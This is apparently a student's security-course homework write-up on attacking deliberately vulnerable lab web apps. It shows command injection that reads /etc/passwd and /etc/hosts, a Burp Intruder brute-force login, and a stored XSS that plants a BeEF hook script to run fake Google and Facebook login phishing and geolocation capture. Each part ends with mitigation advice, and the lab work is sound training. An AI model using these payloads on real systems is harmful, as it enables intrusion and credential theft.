# Web-Vulnerabilities-and-Hardening

Josh Schauert Unit 15 Homework Submission File ( Web Vulnerabilities & Hardening )

Web Application 1: Your Wish is My Command Injection

1.Start the Terminal in your Virtual Machine.

	Run the following command from your Terminal.
	cd ./Documents/web-vulns && docker-compose up
	Once the Docker Containers are up, Open Firefox Web Browser
	Navigate to the following webpage: http://192.168.13.25
	Log in with the following credentials:

    	User name: admin
    	Password: password
    	Select the Command Injection option or access the webpage directly at this page: http://192.168.13.25/vulnerabilities/exec/

As per the ping 8.8.8.8 && pwd there are five levels of sub-directories, see below:Image
Based on above, using the dot-dot-slash method ../ need to do it 5 times to access the payloads, that will display the contents of the following directories/files.

	Ping 8.8.8.8 && cat ../../../../../etc/passwd   

( See Below )
Image

Ping 8.8.8.8 && cat ../../../../../etc/hosts   

( See Below )

Image

Recommended Mitigation Strategies:

-Avoid command line calls where possible. Use of API’s wherever possible

-Set up Input Validation - Command Injection vulnerabilities occur when untrusted input is not sanitized correctly. A white list of possible inputs should be created for the system to accepts only the pre-approved inputs, and avoid the following characters: “;” “&” “|” “`”

-Run with Restricted Permissions - Reduce the number of users who have access to the database and secure the locations of all confidential files and the directories.

Web Application 2: A Brute Force to Be Reckoned With

	From the Terminal in Vagrant run the command sudo burpsuite to start the Burp Suite Community Edition

	Open Firefox browser on Vagrant and navigate to the webpage http://192.168.13.35/ba_insecure_login_1.php

	Make sure the FoxyProxy setting on the web browser is set to Burp.
Image

Select the Payloads tab, and enter the List of Administrators file provided above into the Payload Options [Simple list] for the set 1 and Add the passwords from the Breached list of Passwords file provided above into the Payload Options [Simple list] for the set 2.
Image

Results from the analysis that was completed from the Intruder show that there was one successful login username/password combination. It was user name of "tonystark" and the password "I am Iron Man". Below screenshots display the Successful login! You really are Iron Man :) in the Response tab.
Image
Image

Recommended Mitigation Strategies:

-Lock the account after a fixed number of failed attempts.
    
-Make the Usernames and Passwords more complex, and increase the frequency of changing the passwords.
    	
-Lock out the IP address, if there are multiple login attempts.
    	
-Brute force site scanners. Scan the logs to see if there was a brute force attempted recently.



Web Application 3: Where's the BeEF?

1. Set up BeEF

	From the Terminal in Vagrant run the command sudo beef to start the BeEF
	When prompted for a password, enter cybersecurity.
	This will kick off the BeEF application and return many details about the application to your terminal.
	To access the BeEF GUI, right-click the first URL UI_URL: http://127.0.0.1:3000/ui/panel and select Open Link to open in default browser, or copy the link and open the browser of your choice (Chrome, or Microsoft Edge). Paste it in the address bar and press enter.
	When the BeEF webpage opens, login with the following credentials: - Username: beef - Password: feeb

2. Prepare the Replicants Website

	From the Terminal in Vagrant navigate to ~/Documents/web-vulns directory.
	Run the command sudo docker-compose up
	Go to the browser and enter the following in the address bar: http://192.168.13.25/vulnerabilities/xss_s/
	Reset the database and the login with the following credentials: - Username: admin - Password: password

3. Start the BeEF hook, and write the payload

	From the Terminal copy the BeEF hook: http://127.0.0.1:3000/hook.js
	Write the Payload: <script src="http://127.0.0.1:3000/hook.js"></script>

4. Inject this payload

	When trying to inject the payload there was an issue found, in the message box field, there was a limit of maxlength="50" character in the source code. Therefore we could not inject the payload. ( See below screenshot )


Image

Solution: From the Browser right click the input box and select “inspect element” locate the <textarea name="mtxMessage" cols="50" rows="3" maxlength="50">. Right click and select “edit as html” and change the maxlength "75", or just remove this code limit.

( See below screenshots ) ( Note after changing to 75 after you enter the code to hook and push enter the site automatically resets the max length to “50” as shown in the second screenshot )

Image

Image


A few BeEF exploits

	First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.

	( Once below is visited we are hooked to the website )

Image

Below screenshot shows we are hooked in the beef control panel

Image

To access this exploit, select Google Phishing under Social Engineering.

Image

Fake Google Login Page shown below. User entered is “hackeruser” password was “hackerpass” 

Image

Below Screenshots show the credentials were captured by Beef.
Image



Task details:

	The page you will test is the Replicants Stored XSS application which was used the first day of this unit: http://192.168.13.25/vulnerabilities/xss_s/
	The BeEF hook, which was returned after running the sudo beef command was: http://127.0.0.1:3000/hook.js
	The payload to inject with this BeEF hook is: <script src="http://127.0.0.1:3000/hook.js"></script>


Social Engineering >> Petty Theft

Once hooked to the DVWA page:

Below 2 screenshots show fake facebook login popup setup and initiation 


Image

Image

Below 2 screenshots show the information entered and the capture in beef
Image

Image

Social Engineering >> Fake Notification Bar

Below 2 screenshots show setup and initiation of fake notification bar
Image

Image

Below image shows that the fake notification bar was executed and clicked by the user

Image

Host >> Get Geolocation (Third Party)

Below screenshot shows setup and capture of geolocation in beef
Image

Recommended Mitigation Strategies:

-Keep the system up to date. Restore the VM to a virgin state on a regular basis (once a week, or once a month). Also change passwords regularly, Its best to always assume that you have been compromised.
